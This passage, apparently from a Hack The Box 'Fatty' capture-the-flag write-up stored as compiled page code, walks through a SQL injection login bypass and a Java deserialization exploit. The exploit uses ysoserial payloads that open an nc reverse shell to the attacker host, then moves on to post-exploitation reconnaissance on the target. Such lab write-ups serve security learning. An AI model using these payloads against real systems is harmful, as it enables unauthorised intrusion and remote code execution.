",(0,r.kt)("inlineCode",{parentName:"p"},"user")," to ",(0,r.kt)("inlineCode",{parentName:"p"},"admin"),"."),(0,r.kt)("p",null,"So we end with the following payload"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"cyfun' union select 1337,'qtc','qtc@fatty.htb','5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046','admin\n")),(0,r.kt)("p",null,"Once the payload is injected in the query this will give:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT id,username,email,password,role FROM users WHERE username='cyfun' union select 1337,'qtc','qtc@fatty.htb','5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046','admin'\n")),(0,r.kt)("p",null,"In ",(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/client/gui/ClientGuiTest.java")," we can see the password is set by\nthe ",(0,r.kt)("inlineCode",{parentName:"p"},"setPassword")," function we saw earlier."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'JButton btnNewButton = new JButton("Login ");\nbtnNewButton.addActionListener(new ActionListener() {\n      public void actionPerformed(ActionEvent e) {\n        String username = ClientGuiTest.this.tfUsername.getText().trim();\n        String password = new String(ClientGuiTest.this.tfPassword.getPassword());\n        ClientGuiTest.this.user = new User();\n        ClientGuiTest.this.user.setUsername(username);\n        ClientGuiTest.this.user.setPassword(password);\n\n        try {\n          ClientGuiTest.this.conn = Connection.getConnection();\n        } catch (htb.fatty.client.connection.Connection.ConnectionException e1) {\n          JOptionPane.showMessageDialog(LoginPanel, "Connection Error!", "Error", 0);\n\n          return;\n        }\n\n        if (ClientGuiTest.this.conn.login(ClientGuiTest.this.user)) {\n          JOptionPane.showMessageDialog(LoginPanel, "Login Successful!", "Login", 1);\n')),(0,r.kt)("p",null,"We can also it in ",(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/shared/resources/User.java")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'/*     */   public User(int uid, String username, String password, String email, Role role) {\n/*  20 */     this.uid = uid;\n/*  21 */     this.username = username;\n/*     */\n/*  23 */     String hashString = this.username + password + "clarabibimakeseverythingsecure";\n/*  24 */     MessageDigest digest = null;\n/*     */     try {\n/*  26 */       digest = MessageDigest.getInstance("SHA-256");\n/*  27 */     } catch (NoSuchAlgorithmException e) {\n/*  28 */       e.printStackTrace();\n/*     */     }\n/*  30 */     byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));\n/*     */\n/*  32 */     this.password = DatatypeConverter.printHexBinary(hash);\n/*  33 */     this.email = email;\n/*  34 */     this.role = role;\n/*     */   }\n')),(0,r.kt)("p",null,"Putting our payload as username and ",(0,r.kt)("inlineCode",{parentName:"p"},"clarabibi")," as password should be ok."),(0,r.kt)("p",null,"My injection gave me login failed, so I tried something else:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-diff"},"-cyfun' union select 1337,'qtc','qtc@fatty.htb','5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046','admin\n+cyfun' union select id,username,email,password,'admin' FROM users WHERE username='qtc\n")),(0,r.kt)("p",null,"But still failing, let's get back to ",(0,r.kt)("inlineCode",{parentName:"p"},"setPassword"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'public void setPassword(String password) {\n  String hashString = this.username + password + "clarabibimakeseverythingsecure";\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"this.username")," is used so since we're not providing only ",(0,r.kt)("inlineCode",{parentName:"p"},"qtc")," anymore but our\nSQL payload, the calculated hash will be wrong."),(0,r.kt)("p",null,"So let's patch it into:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'public void setPassword(String password) {\n  String hashString = "qtc" + password + "clarabibimakeseverythingsecure";\n}\n')),(0,r.kt)("p",null,"But I couldn't modify the ",(0,r.kt)("inlineCode",{parentName:"p"},"User.java")," file this way because the dependency\n",(0,r.kt)("inlineCode",{parentName:"p"},"import javax.xml.bind.DatatypeConverter;")," was removed from Java 11+ and\nwe are using Java 14 for ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Col-E/Recaf"},"recaf")," so if this file is touched it can't be recompiled\nby ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Col-E/Recaf"},"recaf")," unless you remove all references to ",(0,r.kt)("inlineCode",{parentName:"p"},"DatatypeConverter"),"."),(0,r.kt)("p",null,"So that's what I did, I removed the imported and change the whole ",(0,r.kt)("inlineCode",{parentName:"p"},"setPassword"),"\nfunction to the following and did the same in User class:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'public void setPassword(String password) {\n    this.password = "5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046";\n}\n')),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/FW7k0V8.png",alt:null})),(0,r.kt)("p",null,"Now we can login with:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Username: ",(0,r.kt)("inlineCode",{parentName:"li"},"cyfun' union select id,username,email,password,'admin' FROM users WHERE username='qtc")),(0,r.kt)("li",{parentName:"ul"},"Password: whatever or void because we hardcoded the hash")),(0,r.kt)("p",null,"Now we have to look at a vuln in an admin-only feature. The only feature\naccepting an input is ",(0,r.kt)("inlineCode",{parentName:"p"},"changePW"),"."),(0,r.kt)("p",null,"On the server: ",(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/server/methods/Commands.java")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'public static String changePW(ArrayList<String> args, User user) {\n  logger.logInfo("[+] Method \'changePW\' was called.");\n  int methodID = 7;\n  if (!user.getRole().isAllowed(methodID)) {\n    logger.logError("[+] Access denied. Method with id \'" + methodID + "\' was called by user \'" + user.getUsername() + "\' with role \'" + user.getRoleName() + "\'.");\n    return "Error: Method \'changePW\' is not allowed for this user account";\n  }\n  String response = "";\n\n  String b64User = args.get(0);\n  byte[] serializedUser = Base64.getDecoder().decode(b64User.getBytes());\n  ByteArrayInputStream bIn = new ByteArrayInputStream(serializedUser);\n\n  try {\n    ObjectInputStream oIn = new ObjectInputStream(bIn);\n\n    User user1 = (User)oIn.readObject();\n  } catch (Exception e) {\n    e.printStackTrace();\n    response = response + "Error: Failure while recovering the User object.";\n    return response;\n  }\n\n  response = response + "Info: Your call was successful, but the method is not fully implemented yet.";\n  return response;\n}\n')),(0,r.kt)("p",null,"We can see on the server that an object is create from the user input ",(0,r.kt)("inlineCode",{parentName:"p"},"(User)oIn.readObject();"),"."),(0,r.kt)("p",null,"There is an article an associated code repository explaining unserialize exploits\nin Java commons-collections library:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#thevulnerability"},"Article")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://github.com/foxglovesec/JavaUnserializeExploits"},"Code"))),(0,r.kt)("p",null,"It seems we have the vulnerable class InvokerTransformer and commons-collection:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ grep -r InvokerTransformer server_source\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */ public class InvokerTransformer\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  56 */     return new InvokerTransformer(methodName);\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  77 */       return new InvokerTransformer(methodName);\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  81 */     return new InvokerTransformer(methodName, paramTypes, args);\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */   private InvokerTransformer(String methodName) {\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */   public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 128 */       throw new FunctorException("InvokerTransformer: The method \'" + this.iMethodName + "\' on \'" + input.getClass() + "\' does not exist");\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 130 */       throw new FunctorException("InvokerTransformer: The method \'" + this.iMethodName + "\' on \'" + input.getClass() + "\' cannot be accessed");\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 132 */       throw new FunctorException("InvokerTransformer: The method \'" + this.iMethodName + "\' on \'" + input.getClass() + "\' threw an exception", ex);\nserver_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* Location:              /home/cyfun/CTF/HackTheBox/machines/Fatty/fatty-server.jar!/org/apache/commons/collections/functors/InvokerTransformer.class\nserver_source/org/apache/commons/collections/ClosureUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;\nserver_source/org/apache/commons/collections/ClosureUtils.java:/* 160 */     return asClosure(InvokerTransformer.getInstance(methodName));\nserver_source/org/apache/commons/collections/ClosureUtils.java:/* 179 */     return asClosure(InvokerTransformer.getInstance(methodName, paramTypes, args));\nserver_source/org/apache/commons/collections/PredicateUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;\nserver_source/org/apache/commons/collections/PredicateUtils.java:/* 218 */     return asPredicate(InvokerTransformer.getInstance(methodName));\nserver_source/org/apache/commons/collections/PredicateUtils.java:/* 243 */     return asPredicate(InvokerTransformer.getInstance(methodName, paramTypes, args));\nserver_source/org/apache/commons/collections/TransformerUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;\nserver_source/org/apache/commons/collections/TransformerUtils.java:/* 407 */     return InvokerTransformer.getInstance(methodName, null, null);\nserver_source/org/apache/commons/collections/TransformerUtils.java:/* 425 */     return InvokerTransformer.getInstance(methodName, paramTypes, args);\n')),(0,r.kt)("p",null,"However we don't know which version of the library is used."),(0,r.kt)("h2",{id:"java-object-deserialization-exploit"},"Java object deserialization exploit"),(0,r.kt)("p",null,"Let's craft a reverse shell with ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/frohoff/ysoserial"},"ysoserial"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ysoserial CommonsCollections5 'nc 10.10.14.89 8888 -e /bin/sh' > revshell.ser\n")),(0,r.kt)("p",null,"But if we try to send it with receive this error, telling us the code on the\nclient is not totally finished."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/g7DsybZ.png",alt:null})),(0,r.kt)("p",null,"Let's see where do this error comes from:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ grep -r \'Not implemented yet\' client_source\nclient_source/htb/fatty/client/gui/ClientGuiTest.java:/* 560 */             JOptionPane.showMessageDialog(passwordChange, "Not implemented yet.", "Error", 0);\n')),(0,r.kt)("p",null,"The button is not mapped to ",(0,r.kt)("inlineCode",{parentName:"p"},"changePW")," function."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'changePassword.addActionListener(new ActionListener()\n    {\n      public void actionPerformed(ActionEvent e) {\n        controlPanel.setVisible(false);\n        passwordChange.setVisible(true);\n      }\n    });\n\npwChangeButton.addActionListener(new ActionListener()\n    {\n      public void actionPerformed(ActionEvent e) {\n        JOptionPane.showMessageDialog(passwordChange, "Not implemented yet.", "Error", 0);\n\n        passwordChange.setVisible(false);\n        controlPanel.setVisible(true);\n      }\n    });\n')),(0,r.kt)("p",null,"Let's see ",(0,r.kt)("inlineCode",{parentName:"p"},"changePW")," on the client: ",(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/client/methods/Invoker.java")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'public String changePW(String username, String newPassword) throws MessageParseException, MessageBuildException, IOException {\n  String methodName = (new Object() {  }).getClass().getEnclosingMethod().getName();\n  logger.logInfo("[+] Method \'" + methodName + "\' was called by user \'" + this.user.getUsername() + "\'.");\n  if (AccessCheck.checkAccess(methodName, this.user)) {\n    return "Error: Method \'" + methodName + "\' is not allowed for this user account";\n  }\n\n  User user = new User(username, newPassword);\n  ByteArrayOutputStream bOut = new ByteArrayOutputStream();\n\n  try {\n    ObjectOutputStream oOut = new ObjectOutputStream(bOut);\n    oOut.writeObject(user);\n  } catch (IOException e) {\n    e.printStackTrace();\n    return "Failure while serializing user object";\n  }\n  byte[] serializedUser64 = Base64.getEncoder().encode(bOut.toByteArray());\n  this.action = new ActionMessage(this.sessionID, "changePW");\n  this.action.addArgument(new String(serializedUser64));\n  sendAndRecv();\n  if (this.response.hasError()) {\n    return "Error: Your action caused an error on the application server!";\n  }\n  return this.response.getContentAsString();\n}\n')),(0,r.kt)("p",null,"So what we have to do is patch ",(0,r.kt)("inlineCode",{parentName:"p"},"pwChangeButton.addActionListener")," and\nreplace"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'JOptionPane.showMessageDialog(passwordChange, "Not implemented yet.", "Error", 0);\n')),(0,r.kt)("p",null,"by"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'import java.nio.file.*;\n\ntry {\n    String data = new String(Files.readAllBytes(Paths.get("revshell.ser")));\n    ClientGuiTest.this.invoker.changePW("qtc", data);\n} catch (Exception e42) {\n    JOptionPane.showMessageDialog(passwordChange, "WTF happened", "Error", 0);\n    e42.printStackTrace();\n}\n')),(0,r.kt)("p",null,"Also ",(0,r.kt)("inlineCode",{parentName:"p"},"changePW")," will call the User class overloaded constructor with 2 args\n",(0,r.kt)("inlineCode",{parentName:"p"},"public User(String username, String password)")," that will call the full User\nconstructor ",(0,r.kt)("inlineCode",{parentName:"p"},"User(int uid, String username, String password, String email, Role role)"),"."),(0,r.kt)("p",null,"But in the full constructor the password is hashed so we need to change it from:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'/*     */   public User(int uid, String username, String password, String email, Role role) {\n/*  20 */     this.uid = uid;\n/*  21 */     this.username = username;\n/*     */\n/*  23 */     String hashString = this.username + password + "clarabibimakeseverythingsecure";\n/*  24 */     MessageDigest digest = null;\n/*     */     try {\n/*  26 */       digest = MessageDigest.getInstance("SHA-256");\n/*  27 */     } catch (NoSuchAlgorithmException e) {\n/*  28 */       e.printStackTrace();\n/*     */     }\n/*  30 */     byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));\n/*     */\n/*  32 */     this.password = DatatypeConverter.printHexBinary(hash);\n/*  33 */     this.email = email;\n/*  34 */     this.role = role;\n/*     */   }\n')),(0,r.kt)("p",null,"to"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},"public User(int uid, String username, String password, String email, Role role) {\n  this.uid = uid;\n  this.username = username;\n  this.password = password;\n  this.email = email;\n  this.role = role;\n}\n")),(0,r.kt)("p",null,"But I always end with this error:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"java.io.NotSerializableException: htb.fatty.shared.resources.Role\n        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1184)\n        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)\n        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)\n        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)\n        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)\n        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)\n        at htb.fatty.client.methods.Invoker.changePW(Invoker.java:133)\n        at htb.fatty.client.gui.ClientGuiTest$16.actionPerformed(ClientGuiTest.java:442)\n        at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2022)\n        at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2348)\n        at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)\n        at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)\n        at javax.swing.AbstractButton.doClick(AbstractButton.java:376)\n        at javax.swing.plaf.basic.BasicMenuItemUI.doClick(BasicMenuItemUI.java:842)\n        at javax.swing.plaf.basic.BasicMenuItemUI$Handler.mouseReleased(BasicMenuItemUI.java:886)\n        at java.awt.Component.processMouseEvent(Component.java:6539)\n        at javax.swing.JComponent.processMouseEvent(JComponent.java:3324)\n        at java.awt.Component.processEvent(Component.java:6304)\n        at java.awt.Container.processEvent(Container.java:2239)\n        at java.awt.Component.dispatchEventImpl(Component.java:4889)\n        at java.awt.Container.dispatchEventImpl(Container.java:2297)\n        at java.awt.Component.dispatchEvent(Component.java:4711)\n        at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4904)\n        at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4535)\n        at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4476)\n        at java.awt.Container.dispatchEventImpl(Container.java:2283)\n        at java.awt.Window.dispatchEventImpl(Window.java:2746)\n        at java.awt.Component.dispatchEvent(Component.java:4711)\n        at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:760)\n        at java.awt.EventQueue.access$500(EventQueue.java:97)\n        at java.awt.EventQueue$3.run(EventQueue.java:709)\n        at java.awt.EventQueue$3.run(EventQueue.java:703)\n        at java.security.AccessController.doPrivileged(Native Method)\n        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:74)\n        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:84)\n        at java.awt.EventQueue$4.run(EventQueue.java:733)\n        at java.awt.EventQueue$4.run(EventQueue.java:731)\n        at java.security.AccessController.doPrivileged(Native Method)\n        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:74)\n        at java.awt.EventQueue.dispatchEvent(EventQueue.java:730)\n        at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:205)\n        at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:116)\n        at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:105)\n        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:101)\n        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:93)\n        at java.awt.EventDispatchThread.run(EventDispatchThread.java:82)\n")),(0,r.kt)("p",null,"The error is hit in this chunk of code:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'        try {\n            ObjectOutputStream oOut = new ObjectOutputStream(bOut);\n            oOut.writeObject(user);\n        }\n        catch (IOException e) {\n            e.printStackTrace();\n            return "Failure while serializing user object";\n        }\n')),(0,r.kt)("p",null,"The user class is serializable:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},"public class User\n  implements Serializable\n")),(0,r.kt)("p",null,"but not the role class"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},"public class Role\n")),(0,r.kt)("p",null,"As said in ",(0,r.kt)("a",{parentName:"p",href:"https://stackoverflow.com/questions/13895867/why-does-writeobject-throw-java-io-notserializableexception-and-how-do-i-fix-it"},"this stackOverflow post"),"\nwe either need to:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"make the Role class ",(0,r.kt)("inlineCode",{parentName:"li"},"Serializable")),(0,r.kt)("li",{parentName:"ul"},"mark the Role field as ",(0,r.kt)("inlineCode",{parentName:"li"},"transient")," is it's unneeded in the serialized form")),(0,r.kt)("p",null,"So I added ",(0,r.kt)("inlineCode",{parentName:"p"},"implements Serializable")," on the Role class, now I don't have error\non client side but instead ",(0,r.kt)("inlineCode",{parentName:"p"},"Error: Failure while recovering the User object."),"\nbecause it's a shared library so the client can now serialize it but the\nserver can't deserialize it as the shared library on server side remains untouched."),(0,r.kt)("p",null,"So I guess we will have to not serialize it. So I marked the field as"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},"implements Serializable {\n    int uid;\n    String username;\n    String password;\n    String email;\n    transient Role role;\n")),(0,r.kt)("p",null,"but I ended up with the same deserialization error."),(0,r.kt)("p",null,"Because the server expect a user object, I thought that anything else would be\nrefused."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},"User user1 = (User)oIn.readObject();\n")),(0,r.kt)("p",null,"But in fact we should send our raw serialized payload without trying to package it\nas the password of the user object."),(0,r.kt)("p",null,"So here is the final client GUI modification:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'        pwChangeButton.addActionListener(new ActionListener(){\n\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                String response = "";\n                try {\n                    response = ClientGuiTest.this.invoker.changePW("cyfun", "whatever");\n                }\n                catch (MessageBuildException | MessageParseException e1) {\n                    JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);\n                }\n                catch (IOException e2) {\n                    JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);\n                }\n                passwordChange.setVisible(false);\n                controlPanel.setVisible(true);\n                textPane.setText(response);\n            }\n        });\n')),(0,r.kt)("p",null,"And the final ",(0,r.kt)("inlineCode",{parentName:"p"},"changePW")," modification:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'import java.io.File;\n\n    public String changePW(String username, String newPassword) throws MessageParseException, MessageBuildException, IOException {\n        String methodName = new Object(){}.getClass().getEnclosingMethod().getName();\n        logger.logInfo("[+] Method \'" + methodName + "\' was called by user \'" + this.user.getUsername() + "\'.");\n        if (AccessCheck.checkAccess(methodName, this.user)) {\n            return "Error: Method \'" + methodName + "\' is not allowed for this user account";\n        }\n        //String data = new String(Files.readAllBytes(Paths.get("revshell.ser")));\n        //data.getBytes()\n        File fd = new File("revshell.ser");\n        byte[] data = Files.readAllBytes(fd.toPath());\n        byte[] serializedUser64 = Base64.getEncoder().encode(data);\n        System.console().writer().println(new String(serializedUser64));\n        this.action = new ActionMessage(this.sessionID, "changePW");\n        this.action.addArgument(new String(serializedUser64));\n        this.sendAndRecv();\n        if (this.response.hasError()) {\n            return "Error: Your action caused an error on the application server!";\n        }\n        return this.response.getContentAsString();\n    }\n')),(0,r.kt)("p",null,"In the first time I just generate my payload with a pingback to make sure it works."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ysoserial CommonsCollections5 'wget http://10.10.14.114:8888' > revshell.ser\n")),(0,r.kt)("p",null,"Now let's try to get a reverse shell."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ysoserial CommonsCollections5 'nc 10.10.14.114 8888 -e /bin/sh' > revshell.ser\n")),(0,r.kt)("p",null,"Awesome we get it:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pwncat -l 8888 -vv\nINFO: Listening on :::8888 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.174:33803 (family 2/IPv4, TCP)\nid\nuid=1000(qtc) gid=1000(qtc) groups=1000(qtc)\n")),(0,r.kt)("h2",{id:"system-reconnaissance"},"System reconnaissance"),(0,r.kt)("p",null,"Looks like the shell we can get are limiteds:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"cat /etc/shells\n# valid login shells\n/bin/sh\n/bin/ash\n")),(0,r.kt)("p",null,"A Debian kernel on an Alpine distro? It highly seems like we are in a docker\ncontainer:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'uname -a\nLinux 032784d4da1d 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 Linux\n\ncat /etc/os-release\nNAME="Alpine Linux"\nID=alpine\nVERSION_ID=3.9.4\nPRETTY_NAME="Alpine Linux v3.9"\nHOME_URL="https://alpinelinux.org/"\nBUG_REPORT_URL="https://bugs.alpinelinux.org/"\n')),(0,r.kt)("p",null,"Where are we?"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"pwd\n/home/qtc\n\nls -lhA\ntotal 8\ndrwx------    1 qtc      qtc         4.0K Oct 30  2019 .ssh\n----------    1 qtc      qtc           33 Oct 30  2019 user.txt\n")),(0,r.kt)("p",null,"Let's read the user flag:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"chmod u+r user.txt\n\ncat user.txt\n7fab2c31fc7173a86872db45ae922073\n")),(0,r.kt)("p",null,"There are some scheduled jobs:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"/etc/crontabs:\ntotal 16\ndrwxr-xr-x    1 root     root          4096 Jan 29  2020 .\ndrwxr-xr-x    1 root     root          4096 Jan 29  2020 ..\n-rw-------    1 root     root            64 Oct 30  2019 qtc\n-rw-------    1 root     root           283 Jan 23  2019 root\n\n/etc/crontabs.back:\ntotal 20\ndrwxr-xr-x    2 qtc      qtc           4096 Oct 30  2019 .\ndrwxr-xr-x    1 root     root          4096 Jan 29  2020 ..\n-rw-------    1 qtc      qtc              4 Oct 30  2019 cron.update\n-rw-------    1 qtc      qtc             64 Oct 30  2019 qtc\n-rw-------    1 qtc      qtc            283 Oct 30  2019 root\n")),(0,r.kt)("p",null,"Thanks to the backup directory we can read them:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"cat /etc/crontabs.back/qtc\n0 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/\n\ncat /etc/crontabs.back/root\n# do daily/weekly/monthly maintenance\n# min   hour    day     month   weekday command\n*/15    *       *       *       *       run-parts /etc/periodic/15min\n0       *       *       *       *       run-parts /etc/periodic/hourly\n0       2       *       *       *       run-parts /etc/periodic/daily\n0       3       *       *       6       run-parts /etc/periodic/weekly\n0       5       1       *       *       run-parts /etc/periodic/monthly\n")),(0,r.kt)("p",null,"There is a tar archive created from the logs, and we have permissions over\nthe 2 folders:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"ls -lh /opt/fatty\ntotal 10592\n-rw-r--r--    1 root     root       10.3M Oct 30  2019 fatty-server.jar\ndrwxr-xr-x    5 root     root        4.0K Oct 30  2019 files\ndrwxr-xr-x    1 qtc      qtc         4.0K Jan 29  2020 logs\n-rwxr-xr-x    1 root     root         406 Oct 30  2019 start.sh\ndrwxr-xr-x    1 qtc      qtc         4.0K Jul 30 12:00 tar\n")),(0,r.kt)("p",null,"I'll use ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/DominicBreuker/pspy"},"pspy")," to try to catch some flash events."),(0,r.kt)("p",null,"Lets download ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/DominicBreuker/pspy"},"pspy")," on our machine:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64\n")),(0,r.kt)("p",null,"Then start a web server to serve it:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ruby -run -e httpd . -p 9999\n[2020-07-30 22:41:59] INFO  WEBrick 1.6.0\n[2020-07-30 22:41:59] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]\n[2020-07-30 22:41:59] INFO  WEBrick::HTTPServer#start: pid=62423 port=9999\n")),(0,r.kt)("p",null,"Then on the target retrieve it and executes it:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"cd /tmp\n\nwget http://10.10.14.114:9999/pspy64\n\nchmod u+x pspy64\n\n./pspy64\npspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855\n\n\n     \u2588\u2588\u2593\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2593\u2588\u2588\u2588 \u2593\u2588\u2588   \u2588\u2588\u2593\n    \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588  \u2588\u2588\u2592\n    \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2591 \u2593\u2588\u2588\u2584   \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592 \u2592\u2588\u2588 \u2588\u2588\u2591\n    \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592  \u2592   \u2588\u2588\u2592\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592 \u2591 \u2590\u2588\u2588\u2593\u2591\n    \u2592\u2588\u2588\u2592 \u2591  \u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2592 \u2591  \u2591 \u2591 \u2588\u2588\u2592\u2593\u2591\n    \u2592\u2593\u2592\u2591 \u2591  \u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591\u2592\u2593\u2592\u2591 \u2591  \u2591  \u2588\u2588\u2592\u2592\u2592\n    \u2591\u2592 \u2591     \u2591 \u2591\u2592  \u2591 \u2591\u2591\u2592 \u2591     \u2593\u2588\u2588 \u2591\u2592\u2591\n    \u2591\u2591       \u2591  \u2591  \u2591  \u2591\u2591       \u2592 \u2592 \u2591\u2591\n                   \u2591           \u2591 \u2591\n                               \u2591 \u2591\n\nConfig: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] 